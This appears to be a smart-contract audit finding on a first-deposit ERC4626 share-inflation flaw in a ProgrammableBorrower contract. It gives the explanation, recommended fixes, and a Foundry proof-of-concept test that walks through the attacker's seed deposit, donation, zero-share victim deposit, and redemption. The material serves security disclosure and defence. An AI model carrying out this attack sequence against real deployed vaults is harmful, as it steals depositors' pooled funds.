### Title
ERC4626 first-deposit inflation can steal the programmable borrower’s epoch liquidity - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deposits all idle underlying into a configured ERC4626 vault at epoch start, but accepts the returned share amount without a minimum-share or share-price check. [1](#0-0) [2](#0-1)  A user of that vault can pre-seed one share and donate enough assets so the borrower’s deposit mints zero shares, letting the attacker redeem the pool’s deposit for themselves. [3](#0-2)  The resulting vault loss is tracked internally, but `totalInterestDueNow()` clamps net-negative vault PnL to zero instead of reporting a principal loss to the CDO. [4](#0-3) 

### Finding Description
In programmable-borrower mode, `IdleCDOEpochVariant.startEpoch()` sends surplus pool funds to the configured borrower and then invokes `onStartEpoch()`. [5](#0-4)  `onStartEpoch()` snapshots `underlying.balanceOf(this) + currentVaultAssets` as `epochStartVaultAssets`, deposits the full on-hand balance into `vault`, and activates epoch accounting. [6](#0-5)  `_depositToVault()` stores `vault.deposit(_assetAmount, address(this))` but never checks that `shares != 0` or that the received shares represent approximately `_assetAmount`. [2](#0-1) 

For a permissionless or newly deployed ERC4626 vault, an attacker can deposit `1` asset to receive the first share, donate `A` assets to the vault, and wait for `ProgrammableBorrower` to deposit `A`. With integer share conversion, the borrower receives `A * 1 / (1 + A) = 0` shares while its `A` assets join the vault. [7](#0-6)  The attacker’s single share then redeems approximately `2A + 1`, recovering the donation and extracting the pool’s `A`.

The accounting issue is worse than a deposit-time revert: the borrower had `A` in `epochStartVaultAssets`, but now has zero vault assets. [1](#0-0)  `_vaultNetInterest()` therefore computes a loss, but `totalInterestDueNow()` returns `0` whenever loss exceeds other gains. [4](#0-3)  `IdleCDOEpochVariant._resolveStopEpochInterest()` uses that zero as the stop-epoch interest, while the normal minted-interest stop path does not burn strategy tokens for the vault loss. [8](#0-7) [9](#0-8) 

### Impact Explanation
This is direct theft of pool liquidity plus hidden insolvency. The attacker can recover their donation and take the entire epoch deposit from vault share redemption, leaving `ProgrammableBorrower` with zero underlying exposure while the CDO still holds strategy tokens representing that principal. [10](#0-9)  Because the loss is not propagated to `stopEpoch`, the CDO can finish the epoch successfully and continue showing active tranche NAV backed by strategy tokens whose external assets were already stolen. [11](#0-10)  Later withdrawals or a close-pool recall expose the missing principal and can force borrower-default accounting. [12](#0-11) 

### Likelihood Explanation
The attack requires the configured ERC4626 vault to admit outside users and to permit the classic first-deposit/donation inflation pattern. That is within the intended attack surface because the programmable borrower explicitly supports an external ERC4626 vault user, and initialization only validates that `vault.asset()` matches the CDO token. [13](#0-12)  No privileged role is malicious: the attacker only uses the external vault before honest manager calls `startEpoch()` and `stopEpoch()`. [14](#0-13) 

### Recommendation
- In `_depositToVault()`, require `shares != 0` and enforce a minimum received share amount based on `previewDeposit(_assetAmount)` with bounded slippage.
- Keep a small protected vault position initialized before LP funds are parked, or require configured vaults to implement inflation-resistant virtual shares/assets.
- Propagate negative vault PnL to `IdleCDOEpochVariant` as a realized loss instead of clamping `totalInterestDueNow()` to zero. [4](#0-3) 
- Consider a solvency check in `onStopEpoch()` that reverts or signals default whenever current vault assets plus tracked borrower debt cannot cover the epoch baseline. [15](#0-14) 

### Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCDOTranche} from "../contracts/IdleCDOTranche.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {ProgrammableBorrower} from "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflationERC4626 is ERC20 {
    IERC20Detailed public immutable assetToken;

    constructor(address asset_) ERC20("Inflation Share", "iSHARE") {
        assetToken = IERC20Detailed(asset_);
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 assetsBefore = totalAssets();
        uint256 supply = totalSupply();
        shares = supply == 0 || assetsBefore == 0
            ? assets
            : assets * supply / assetsBefore; // rounds to zero when price is inflated
        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}

contract ProgrammableBorrowerInflationPoC is Test {
    using stdStorage for StdStorage;

    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    IdleCDOEpochVariant cdo;
    IdleCreditVault strategy;
    ProgrammableBorrower borrower;
    InflationERC4626 vault;
    IERC20Detailed usdc = IERC20Detailed(USDC);
    IdleCDOTranche aa;

    address owner = makeAddr("owner");
    address manager = makeAddr("manager");
    address lp = makeAddr("lp");
    address realBorrower = makeAddr("realBorrower");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet");
        vault = new InflationERC4626(USDC);

        strategy = new IdleCreditVault();
        stdstore.target(address(strategy)).sig(strategy.token.selector).checked_write(address(0));
        strategy.initialize(USDC, owner, manager, makeAddr("placeholder"), "Borrower", 0);

        cdo = new IdleCDOEpochVariant();
        stdstore.target(address(cdo)).sig(cdo.token.selector).checked_write(address(0));
        cdo.initialize(0, USDC, address(this), owner, makeAddr("rebalancer"), address(strategy), 100_000);
        aa = IdleCDOTranche(cdo.AATranche());

        ProgrammableBorrower impl = new ProgrammableBorrower();
        borrower = ProgrammableBorrower(address(new TransparentUpgradeableProxy(
            address(impl),
            makeAddr("proxyAdmin"),
            abi.encodeWithSelector(
                ProgrammableBorrower.initialize.selector,
                address(vault),
                address(cdo),
                address(this),
                manager,
                realBorrower,
                0
            )
        )));

        vm.startPrank(owner);
        strategy.setWhitelistedCDO(address(cdo));
        strategy.setMaxApr(0);
        strategy.setBorrower(address(borrower));
        cdo.setIsAYSActive(false);
        cdo.setFeeParams(address(this), 0, 100_000, 0);
        cdo.setEpochParams(30 days, 5 days);
        cdo.setIsInterestMinted(true);
        cdo.setIsProgrammableBorrower(true);
        vm.stopPrank();

        deal(USDC, lp, 100_000e6);
        deal(USDC, attacker, 200_000e6);
    }

    function testFirstDepositInflationStealsEpochLiquidity() public {
        uint256 depositAmount = 100_000e6;

        vm.startPrank(lp);
        usdc.approve(address(cdo), depositAmount);
        cdo.depositAA(depositAmount);
        vm.stopPrank();

        uint256 attackerBefore = usdc.balanceOf(attacker);
        vm.startPrank(attacker);
        usdc.approve(address(vault), 1);
        vault.deposit(1, attacker);                 // 1 share
        usdc.transfer(address(vault), depositAmount); // donation: 1 share now owns depositAmount + 1
        vm.stopPrank();

        vm.prank(manager);
        cdo.startEpoch();                           // borrower deposits 100_000e6 and gets 0 shares
        assertEq(vault.balanceOf(address(borrower)), 0);

        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);
        assertApproxEqAbs(usdc.balanceOf(attacker) - attackerBefore, depositAmount, 1);
        assertEq(borrower.totalUnderlying(), 0);
        assertEq(strategy.balanceOf(address(cdo)), depositAmount);

        vm.warp(cdo.epochEndDate() + 1);
        vm.prank(manager);
        cdo.stopEpoch(0, 0);                        // succeeds with zero reported interest/loss
        assertFalse(cdo.defaulted());
        assertEq(cdo.lastEpochInterest(), 0);
        assertEq(borrower.totalUnderlying(), 0);    // hidden principal insolvency remains
    }
}
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L108-120)
```text
  function initialize(
    address _vault, address _idleCDO, address _owner,
    address _manager, address _borrower, uint256 _borrowerApr
  ) external initializer {
    if (
      _vault == address(0) || _owner == address(0) || _manager == address(0) ||
      _borrower == address(0) || _idleCDO == address(0)
    ) {
      revert InvalidAddress();
    }
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L206-223)
```text
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L231-268)
```text
  function onStopEpoch(uint256 _amountRequired, bool _isRequestingAllFunds) external nonReentrant returns (bool success) {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // if we want to close the pool and the borrower still owes any amount, consider it a failure and let IdleCDO handle it as a default instead of a close. 
    if (_isRequestingAllFunds && (borrowerPrincipal != 0 || borrowerInterestDebt != 0 || borrowerInterestAccrued != 0)) {
      return false;
    }

    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
    }

    // `totalInterestDueNow()` was already read by IdleCDO before calling this hook, so once the
    // stop flow begins we can clear the previous carry and snapshot the remaining vault sleeve
    // as the baseline for measuring buffer-period vault PnL before the next epoch starts.
    bufferedVaultDelta = 0;
    bufferInterest = 0;
    bufferStartVaultAssets = _currentVaultAssets();

    // Stop reserving epoch-end withdraw liquidity once IdleCDO has started the stop flow.
    epochPendingWithdraws = 0;
    epochAccountingActive = false;
    emit EpochAccountingStopped();
    success = true;
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L330-347)
```text
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }

  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/interfaces/IERC4626.sol (L57-72)
```text
    function convertToShares(uint256 assets) external view returns (uint256 shares);

    /**
     * @dev Returns the amount of assets that the Vault would exchange for the amount of shares provided, in an ideal
     * scenario where all the conditions are met.
     *
     * - MUST NOT be inclusive of any fees that are charged against assets in the Vault.
     * - MUST NOT show any variations depending on the caller.
     * - MUST NOT reflect slippage or other on-chain conditions, when performing the actual exchange.
     * - MUST NOT revert.
     *
     * NOTE: This calculation MAY NOT reflect the “per-user” price-per-share, and instead should reflect the
     * “average-user’s” price-per-share, meaning what the average user should expect to see when exchanging to and
     * from.
     */
    function convertToAssets(uint256 shares) external view returns (uint256 assets);
```

**File:** contracts/interfaces/IERC4626.sol (L102-112)
```text
     * @dev Mints shares Vault shares to receiver by depositing exactly amount of underlying tokens.
     *
     * - MUST emit the Deposit event.
     * - MAY support an additional flow in which the underlying tokens are owned by the Vault contract before the
     *   deposit execution, and are accounted for during deposit.
     * - MUST revert if all of assets cannot be deposited (due to deposit limit being reached, slippage, the user not
     *   approving enough underlying tokens to the Vault contract, etc).
     *
     * NOTE: most implementations will require pre-approval of the Vault with the Vault’s underlying asset token.
     */
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
```

**File:** contracts/IdleCDOEpochVariant.sol (L233-244)
```text
  function startEpoch() external {
    _checkOnlyOwnerOrManager();

    // Check that buffer period passed (and epoch is not running as epochEndDate is set)
    // and that the pool is not closed (ie epochDuration == 0)
    uint256 _epochDuration = epochDuration; 
    _checkNotAllowed(defaulted || block.timestamp < (epochEndDate + bufferPeriod) || _epochDuration == 0);
    _checkProgrammableBorrowerMode();
    // Remove raw donated underlyings before calculating epoch interest or borrower transfer amounts.
    _skimDonatedAssets();

    isEpochRunning = true;
```

**File:** contracts/IdleCDOEpochVariant.sol (L294-303)
```text
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
      // The borrower did not receive the funds, so keep the strategy-token backing in the strategy.
      _transferUnderlyings(address(_strategy), _toBorrower);
      _strategy.reserveDefaultRecovery(_toBorrower);
      _handleBorrowerDefault(_toBorrower);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L357-364)
```text
    _interest = _resolveStopEpochInterest(_interest);

    // Base interest for stopEpoch: explicit override (>1) or precomputed expected epoch interest.
    uint256 _expectedInterest;
    // Strategy finalizes APR0 bucket state and returns adjusted stopEpoch values.
    (_expectedInterest, _pendingWithdrawFees) = _strategy.prepareStopEpochWithApr0(_interest);
    // Pending withdraws may be increased during APR0 settlement, so read after prepareStopEpochWithApr0.
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-405)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

```

**File:** contracts/IdleCDOEpochVariant.sol (L428-436)
```text
      if (_mintInterest) {
        // if interest is not transferred we mint strategy tokens equal to the full epoch interest
        if (_grossInterest != 0) _strategy.mintStrategyTokens(_grossInterest);
        // and increase unclaimedFees by pending withdraw fees before _updateAccounting
        unclaimedFees += _pendingWithdrawFees;
      }

      // update tranche prices and unclaimed fees
      _updateAccounting();
```

**File:** contracts/IdleCDOEpochVariant.sol (L1001-1005)
```text
  function _resolveStopEpochInterest(uint256 _interest) internal view returns (uint256 _resolvedInterest) {
    if (isProgrammableBorrower) {
      _checkNotAllowed(_interest > 1);
      return IProgrammableBorrower(_borrower()).totalInterestDueNow();
    }
```
